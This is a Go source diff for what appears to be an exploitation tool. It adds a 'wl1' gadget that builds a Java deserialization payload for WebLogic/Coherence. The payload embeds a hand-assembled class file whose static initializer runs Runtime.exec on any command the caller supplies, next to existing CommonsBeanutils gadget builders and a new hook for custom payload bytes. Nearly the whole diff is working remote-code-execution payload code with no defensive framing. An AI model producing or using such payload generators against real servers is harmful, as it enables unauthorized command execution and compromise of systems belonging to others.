@@ -21,7 +21,23 @@ func (m *ExecManager) Set(name string, f func(string) []byte) {
 	m.dict[name] = &ExecWrapper{f: f, name: name}
 }
 
+func (m *ExecManager) SetCustom(custom []byte) {
+	name := "custom"
+	f := func(command string) []byte {
+		return custom
+	}
+	m.dict[name] = &ExecWrapper{f: f, name: name}
+}
+
 func (m *ExecManager) Get(name string) (*ExecWrapper, bool) {
+	if gadget, ok := m.dict[name]; ok {
+		return gadget, ok
+	}
+	return nil, false
+}
+
+func (m *ExecManager) GetCustom() (*ExecWrapper, bool) {
+	name := "custom"
 	if gadget, ok := m.dict[name]; ok {
 		return gadget, ok
 	}
@@ -40,6 +56,54 @@ func init() {
 	IExecManager.dict = make(map[string]*ExecWrapper)
 	IExecManager.Set("cb1v18", commonsBeanutils1v18)
 	IExecManager.Set("cb1v19", commonsBeanutils1v19)
+	IExecManager.Set("wl1", weblogic1)
+}
+
+func weblogic1(command string) []byte {
+	iexec := func(command string) []byte {
+		var (
+			prefix  = []byte("\xca\xfe\xba\xbe\x00\x00\x004\x00\x1b\x01\x00\x01X\x07\x00\x07\x01\x00\x10java/lang/Object\x07\x00\x03\x01\x00\nSourceFile\x01\x00\x06X.java\x01\x00$x/X$A63EB65B5CEDD1B16A986727CF372CEE\x01\x00\x08<clinit>\x01\x00\x03()V\x01\x00\x04Code\x01\x00\x11java/lang/Runtime\x07\x00\x0b\x01\x00\ngetRuntime\x01\x00\x15()Ljava/lang/Runtime;\x0c\x00\r\x00\x0e\n\x00\x0c\x00\x0f\x01")
+			postfix = []byte("\x08\x00\x11\x01\x00\x04exec\x01\x00'(Ljava/lang/String;)Ljava/lang/Process;\x0c\x00\x13\x00\x14\n\x00\x0c\x00\x15\x01\x00\rStackMapTable\x01\x00\x06<init>\x0c\x00\x18\x00\t\n\x00\x04\x00\x19\x00!\x00\x02\x00\x04\x00\x00\x00\x00\x00\x02\x00\x08\x00\x08\x00\t\x00\x01\x00\n\x00\x00\x00$\x00\x03\x00\x02\x00\x00\x00\x0f\xa7\x00\x03\x01L\xb8\x00\x10\x12\x12\xb6\x00\x16W\xb1\x00\x00\x00\x01\x00\x17\x00\x00\x00\x03\x00\x01\x03\x00\x01\x00\x18\x00\t\x00\x01\x00\n\x00\x00\x00\x11\x00\x01\x00\x01\x00\x00\x00\x05*\xb7\x00\x1a\xb1\x00\x00\x00\x00\x00\x01\x00\x05\x00\x00\x00\x02\x00\x06")
+		)
+		buf := make([]byte, 0)
+		buf = append(postfix, buf...)
+
+		buf = append([]byte(command), buf...)
+
+		buf = append(make([]byte, 2), buf...)
+		binary.BigEndian.PutUint16(buf, uint16(len(command)))
+
+		buf = append(prefix, buf...)
+
+		return buf
+	}
+	var (
+		prefix  = []byte("\xac\xed\x00\x05sr\x00)weblogic.rmi.provider.BasicServiceContext\xe4c\"6\xc5\xd4\xa7\x1e\x0c\x00\x00xpw\x02\x01\x00sr\x00.com.tangosol.coherence.servlet.AttributeHolder\xcc0\xa4x=\xefj\xc1\x0c\x00\x00xpz\x00\x00\x02X@\n3com.tangosol.internal.util.invoke.RemoteConstructor\n1com.tangosol.internal.util.invoke.ClassDefinition\n/com.tangosol.internal.util.invoke.ClassIdentity\x01x\x01X A63EB65B5CEDD1B16A986727CF372CEE")
+		postfix = []byte("\x00\x00\x00\x00xx")
+	)
+	buf := make([]byte, 0)
+	buf = append(postfix, buf...)
+
+	class := iexec(command)
+	buf = append(class, buf...)
+
+	n := len(class)
+	b := 0
+	b |= n & 63
+
+	cl := make([]byte, 0)
+	for n = n >> 6; n != 0; n = n >> 7 {
+		b |= 128
+		cl = append(cl, byte(b))
+		b = n & 127
+	}
+	cl = append(cl, byte(b))
+
+	buf = append(cl, buf...)
+
+	buf = append(prefix, buf...)
+
+	return buf
 }
 
 func commonsBeanutils1v18(command string) []byte {
@@ -52,11 +116,11 @@ func commonsBeanutils1v18(command string) []byte {
 	buf := make([]byte, 0)
 	buf = append(postfix, buf...)
 
-	template := exec(command)
-	buf = append(template, buf...)
+	class := exec(command)
+	buf = append(class, buf...)
 
 	buf = append(make([]byte, 4), buf...)
-	binary.BigEndian.PutUint32(buf, uint32(len(template)))
+	binary.BigEndian.PutUint32(buf, uint32(len(class)))
 
 	buf = append(midfix, buf...)
 	buf = append(uid, buf...)
@@ -74,11 +138,11 @@ func commonsBeanutils1v19(command string) []byte {
 	buf := make([]byte, 0)
 	buf = append(postfix, buf...)
 
-	template := exec(command)
-	buf = append(template, buf...)
+	class := exec(command)
+	buf = append(class, buf...)
 
 	buf = append(make([]byte, 4), buf...)
-	binary.BigEndian.PutUint32(buf, uint32(len(template)))
+	binary.BigEndian.PutUint32(buf, uint32(len(class)))
 
 	buf = append(midfix, buf...)
 	buf = append(uid, buf...)
